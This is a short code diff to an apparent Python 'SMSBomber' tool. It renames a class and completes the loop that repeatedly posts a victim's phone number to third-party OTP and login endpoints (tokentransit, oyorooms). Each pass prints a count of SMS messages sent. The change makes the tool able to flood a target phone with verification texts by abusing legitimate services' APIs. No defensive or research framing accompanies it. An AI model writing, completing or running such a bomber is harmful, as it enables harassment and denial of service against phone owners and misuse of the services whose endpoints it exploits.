@@ -22,7 +22,7 @@ from colorama import Fore
 from utils.randomuser import users
 
 
-class spam:
+class Spam:
     def __init__(self, number, count, throttle):
         url = ["https://api.tokentransit.com/v1/user/login?env=live&phone_number=%2B1%20" + number,
                "https://www.oyorooms.com/api/pwa/generateotp?country_code=%2B" + str(91) + "&nod=4&phone=" + number,
@@ -37,7 +37,7 @@ class spam:
 
         for i in range(int(count) + 1):
             try:
-                req
+                req = session.post(random.choice(url))
                 time.sleep(int(throttle))
                 print(f"{Fore.GREEN}[*] SMSBomber : \t sent {i + 1} sms to {number}")
             except Exception as e:
